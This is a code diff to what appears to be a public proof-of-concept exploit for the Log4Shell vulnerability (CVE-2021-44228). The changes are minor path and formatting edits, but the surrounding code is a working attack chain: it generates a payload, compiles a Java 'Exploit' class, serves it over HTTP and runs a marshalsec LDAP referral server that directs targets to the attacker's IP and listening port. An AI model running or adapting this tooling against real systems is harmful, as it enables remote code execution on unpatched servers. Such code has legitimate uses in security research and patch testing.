@@ -5,8 +5,10 @@ from colorama import Fore, init
 import subprocess
 import threading
 from pathlib import Path
-
+import os
 from http.server import HTTPServer, SimpleHTTPRequestHandler
+
+CUR_FOLDER = Path(__file__).parent.resolve()
 
 
 def generate_payload(userip: str, lport: int) -> None:
@@ -57,7 +59,7 @@ public class Exploit {
 
     try:
         p.write_text(program)
-        subprocess.run(["./jdk1.8.0_20/bin/javac", str(p)])
+        subprocess.run([os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/javac"), str(p)])
     except OSError as e:
         print(Fore.RED + f'[-] Something went wrong {e}')
         raise e
@@ -82,7 +84,7 @@ def payload(userip: str, webport: int, lport: int) -> None:
 
 def check_java() -> bool:
     exit_code = subprocess.call([
-        './jdk1.8.0_20/bin/java',
+        os.path.join(CUR_FOLDER, 'jdk1.8.0_20/bin/java'),
         '-version',
     ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
     return exit_code == 0
@@ -94,9 +96,9 @@ def ldap_server(userip: str, lport: int) -> None:
 
     url = "http://{}:{}/#Exploit".format(userip, lport)
     subprocess.run([
-        "./jdk1.8.0_20/bin/java",
+        os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/java"),
         "-cp",
-        "target/marshalsec-0.0.3-SNAPSHOT-all.jar",
+        os.path.join(CUR_FOLDER, "target/marshalsec-0.0.3-SNAPSHOT-all.jar"),
         "marshalsec.jndi.LDAPRefServer",
         url,
     ])
@@ -104,7 +106,7 @@ def ldap_server(userip: str, lport: int) -> None:
 
 def main() -> None:
     init(autoreset=True)
-    print(Fore.BLUE+"""
+    print(Fore.BLUE + """
 [!] CVE: CVE-2021-44228
 [!] Github repo: https://github.com/kozmer/log4j-shell-poc
 """)
